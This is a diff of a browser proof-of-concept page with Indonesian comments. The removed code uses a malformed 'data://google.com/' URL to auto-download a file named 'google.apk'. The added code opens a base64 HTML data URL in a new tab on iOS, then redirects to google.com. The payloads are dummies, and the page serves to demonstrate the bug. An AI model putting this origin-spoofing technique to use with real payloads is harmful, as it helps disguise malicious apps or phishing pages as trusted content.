@@ -2,31 +2,45 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Malformed Data URL PoC</title>
+  <title>iOS Advanced PoC</title>
 </head>
 <body>
 
-<h3>Malformed data:// APK PoC</h3>
-<button onclick="go()">Start</button>
+<h3>iOS Advanced Data URL PoC</h3>
+<button id="start">Start</button>
 
 <script>
-function go() {
-  // dummy base64 kecil
-  const base64 = "ZXN0dGVzdA==";
+document.getElementById('start').addEventListener('click', () => {
+  try {
+    // konten HTML (lebih kuat daripada text/plain)
+    const content = `
+      <html>
+      <body style="font-family:sans-serif;text-align:center;margin-top:50px;">
+        <h2>iOS File Preview</h2>
+        <p>This file was opened via data URL</p>
+        <button onclick="alert('Hello from inside file!')">Click Me</button>
+      </body>
+      </html>
+    `;
 
-  // ⚠️ kunci bug ada di sini: data://google.com/
-  const payload = "data://google.com/application/vnd.android.package-archive;base64," + base64;
+    const base64 = btoa(unescape(encodeURIComponent(content)));
 
-  // trigger download
-  const a = document.createElement('a');
-  a.href = payload;
-  a.download = "google.apk";
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
+    const payload = "data:text/html;base64," + base64;
 
-  console.log("Triggered malformed data:// download");
-}
+    // buka di tab baru (lebih reliable di iOS)
+    const w = window.open(payload, "_blank");
+
+    console.log("Data URL opened in new tab");
+
+    // redirect halaman utama
+    setTimeout(() => {
+      window.location.href = "https://google.com";
+    }, 800);
+
+  } catch (e) {
+    console.error(e);
+  }
+});
 </script>
 
 </body>
